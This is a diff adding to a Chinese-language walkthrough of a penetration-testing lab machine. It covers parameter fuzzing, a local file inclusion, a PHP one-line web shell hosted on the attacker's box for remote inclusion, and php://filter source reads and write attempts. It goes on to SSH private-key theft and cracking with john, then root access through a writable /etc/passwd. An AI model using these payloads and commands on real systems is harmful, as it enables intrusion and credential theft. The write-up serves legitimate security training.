@@ -142,6 +142,246 @@ ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:PARAM
 
 到这里，我就想是否这个服务器存在文件上传漏洞，而参数值为路径名
 
+我们知道在当前目录的上一个目录一定存在 `index.html` 
+
+所以我们可以使用这个文件来爆破参数
+
+```bash
+ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
+-u http://10.0.2.10/secret/evil.php?FUZZ=../index.html \
+-fs 0
+```
++ `FUZZ` 代表使用前面指定的字典匹配
+
+发现成功匹配出一个参数 `command`
+
+![alt](./mechine6.assets/2022-08-13_22-48.png)
 
 
+我们在浏览器上验证一下这个参数是否有效
 
+![alt](./mechine6.assets/2022-08-13_22-54.png)
+
+![alt](./mechine6.assets/2022-08-13_23-02.png)
+
+
+我们在 `/var/www/html` 下新建一个一句话木马的 php 文件 ( `hacker.php` )
+
+```php
+<?php $var=shell_exec($_GET['cmd']); echo $var ?>
+```
+
+然后我们开启 `apache` 服务，kali 里默认有 `apache2` 服务,我们只需要使用一下命令，将其开启即可
+
+```bash
+sudo systemctl start apache2
+```
+![alt](./mechine6.assets/2022-08-13_23-31.png)
+
+开启之后，我们尝试一下目标靶机上是否存在远程文件包含漏洞,执行完下面的命令之后，发现并没有回显出我们想要的效果
+
+`?command=http://10.0.2.7/hacker.php?cmd=id`
+
+![](./mechine6.assets/2022-08-13_23-35.png)
+
+## PHP 封装器
+
+既然目标靶机可能不存在远程文件包含漏洞,那我们就要去发现目标靶机是否存在别的漏洞.
+
+> 发现漏洞最好的办法就是代码审计!
+
+所以如果我们能去查看目标系统上已经存在的文件 `evil.php` 的内容，是否能通过它来发现更多漏洞 ?
+
+**我们可以使用 PHP 的封装器来尝试读取目标靶机内的文件**
+
+我们知道,在正常情况下，我们并不能读取到目标服务器上的 PHP 代码内容，我们网页上看到的都是 PHP 执行完后的结果.
+
+ 因为我们已经知道目标服务器上存在文件包含的漏洞，<font color='red' face=Monaco size=3>所以我们可以尝试使用 PHP 封装器的编码功能将 PHP 代码进行编码,然后在本地进行解码，从而查看其服务器上的 PHP 源码</font>
+
+当我们执行下面这段代码之后我们发现我们成功得到一串 base64 编码的字符串。
+
+```php
+?command=php://filter/convert.base64-encode/resource=evil.php
+```
+
+![alt](./mechine6.assets/2022-08-13_23-46.png)
+
+我们成功得到一串 `evil.php` 源码经过 base64 编码过后的结果:
+
+`PD9waHAKICAgICRmaWxlbmFtZSA9ICRfR0VUWydjb21tYW5kJ107CiAgICBpbmNsdWRlKCRmaWxlbmFtZSk7Cj8+Cg==`
+
+![alt](./mechine6.assets/2022-08-13_23-50.png)
+
+```php
+<?php
+    $filename = $_GET['command'];
+	include($filename);
+?>
+```
+
+获得了源码之后，发现这个文件并没有别的漏洞可利用了，就是只有刚刚我们利用的，文件包含漏洞产生的原因。
+
+
+<font color='red' face=Monaco size=3>其实 filter 这个 PHP 封装器还有写入的功能</font>  
+
+我们可以先尝试一下，因为我们不知道这个web服务对网站是否有写的权限，我们只知道从目前来看，它拥有读的权限，而写的权限我们并不知道。
+
+所以我们可以使用一下命令来尝试对目标服务器写入一点东西，来测试这个web服务是否对网站目录拥有写的权限。
+我们先在本地生成一串 base64 编码的字符串
+
+![alt](./mechine6.assets/2022-08-14_00-18.png)
+
+
+```php
+?command=php://filter/write=convert.base64-decode/resource=test.php&txt=dGVzdAo=
+```
+
+然而结果却令人遗憾，我们发现我们目标系统上并不存在我们试图写入数据的文件，也就说明，在这个目录下,我们并没有写权限，
+
+![alt](./mechine6.assets/2022-08-14_00-27.png)
+
+至此，对这个参数的测试已经几乎都测试完成，但是我们还没有突破靶机的边界。
+
+
+### SSH 公钥登入
+
+经过一系列 "无用" 的尝试过后,我将目光停留在最开始我们查看 `/etc/passwd`  文件内的内容
+
+我们发现在这个文件里除了 `root` 还有一个用户 `mowree` 而这个用户有 `/bin/bash` 终端，且该名字一看就不是系统用户，然后结合最开始的信息收集 <font color='red' face=Monaco size=3>开放了 22 端口</font>
+
+这时候我就想能否通过 ssh 暴力破解这个用户名的密码。
+
+> 最开始的 SSH 暴力破解是使用 root 账户，或许是因为 root 账户的密码太复杂，所以导致我们暴力破解失败
+
+所以我们非常有必要再对这个用户进行 ssh 连接尝试
+![alt](./mechine6.assets/2022-08-14_00-28.png)
+
+我们先尝试使用 ssh 连接一下这个用户， 记得加 `-v` 参数显示详细连接过程。
+
+```bash
+ssh mowree@10.0.2.10 -v
+```
+我们发现 `mowree` 这个用户有两种 SSH 连接登入方式,一种是使用密码的方式 <font color='red' face=Monaco size=3>还有一种就是使用公私钥对的方式</font>
+
+![alt](./mechine6.assets/2022-08-14_00-44.png)
+
+而我们可以使用我们已经发现的任意文件包含漏洞,来尝试获取其公私钥对，如果能成功获取公私钥对的话，那我们就能通过 ssh 连接上目标靶机
+
+我们成功获取其公私钥
+
+公钥
+![alt](./mechine6.assets/2022-08-14_00-50.png)
+
+我们成功获取到了私钥 <kbd> Ctrl </kbd> + <kbd> U </kbd> 我们查看其源码 ( 这样格式会规范一点 )，然后复制粘贴，保存到本地的 `id_rsa` 里然后尝试使用这个私钥去登入目标服务器
+
+![alt](./mechine6.assets/2022-08-14_00-57.png)
+
+保存之后，我们还需要将这个文件的权限修改一下，如果该文件的权限太低的化，会导致不能正常使用
+
+```bash
+chmod 600 ./id_rsa
+```
+
+```bash
+ssh mowree@10.0.2.10 -i id_rsa
+```
+我们发现这个私钥还被加密了，所以没办法，要突破边界，我们还得对私钥进行暴力破解
+
+![alt](./mechine6.assets/2022-08-14_01-11.png)
+
+
+进行暴力破解，首先我们还是得先准备字典，这边准备使用一个稍微大一点的字典。 `/usr/share/wordlists/rockyou.txt.gz`
+
+```bash
+# copy the dict to work directory
+cp /usr/share/wordlists/rockyou.txt.gz .
+# extract the big dict file
+gunzip ./rockyou.txt.gz
+```
+对 ssh 进行私钥的暴力破解我们可以使用 `john` 这个工具
+
+<font color='red' face=Monaco size=3>但是使用 john 这个工具我们还需要先将私钥的格式进行转换，我们只有转换成 john 工具识别的格式，才能开始进行暴力破解.</font>
+
++ 路径： `/usr/share/john/ssh2john.py`
+
+```bash
+cd /usr/share/john
+./ssh2john.py ~/id_rsa > ~/hash
+```
+格式转换后,我们就能使用我们准备好的字典进行，暴力破解啦。
+
+```bash
+john hash --wordlist=rockyou.txt
+```
+这一次很快我们就成功得到了密码 `unicorn`
+
+![alt](./mechine6.assets/2022-08-14_01-21.png)
+
+我们使用这个密码成功突破边界，拿到了 mowree 用户的 shell
+
+![alt](./mechine6.assets/2022-08-14_01-22.png)
+
+我们也成功拿到第一个 flag 
+
+![alt](./mechine6.assets/2022-08-14_01-30.png)
+
+## 权限提升
+
+我们先查看一下 `sudo` `crontab` 的设置，发现都没有.
+
+然后我们使用 `uname -a` 查看一下当前系统的 Linux 内核版本，去寻找该版本是否有权限提升的漏洞
+
+![alt](./mechine6.assets/2022-08-14_01-33.png)
+
+我们在 kali 里使用 `searchsploit 4.19`
+
+发现确实存在几个漏洞利用代码，但是经过一番尝试后，发现这些利用脚本并不有效
+
+![alt](./mechine6.assets/2022-08-14_01-34.png)
+
+我们使用 `find` 命令来查找系统中所有具有 suid 位的文件。
+
+```bash
+find / -perm /4000 2> /dev/null
+```
+![alt](./mechine6.assets/2022-08-14_01-41.png)
+
+然后我还查找了系统里所有具有 sgid 位的文件
+
+```bash
+find / -perm /2000 2> /dev/null
+```
+![alt](./mechine6.assets/2022-08-14_01-43.png)
+
+然后我就去查找系统上所有我能写入的文件
+
+```bash
+find / -writable 2> /dev/null | grep -v proc | grep -v run | grep -v sys
+```
+![alt](./mechine6.assets/2022-08-14_01-55.png)
+
+我们查找一下有异常写权限的文件，寻找了一段时间后，我既然发现我们对 `/etc/passwd` 这个文件居然是可写的
+
+
+![alt](./mechine6.assets/2022-08-14_01-56.png)
+
+而 `/etc/passwd` 里面有一个密码占位,既然我们可以修改这个文件，那么我们就可以在里面填充任意我想要的密码
+
+我们可以使用 `openssl` 来生成密文 -1 是加密算法的选取
+
+![alt](./mechine6.assets/2022-08-14_01-58.png)
+
+我们将成功生成的密文 （ 明文为 `123.com` ） 插入到 root 的密码占位符 `x` 上
+
+![alt](./mechine6.assets/2022-08-14_01-59.png)
+
+这时候我们 `su root` 再输入我们的明文密码 `123.com` 后发现成功登入 root 账号
+
+![alt](./mechine6.assets/2022-08-14_02-00.png)
+
+我们再进入到 root 的家目录 查看其最后一个 flag
+
+![alt](./mechine6.assets/res.png)
+
+
+<font color='green' face=Monaco size=3>至此这台靶机就已经被打靶成功！</font>
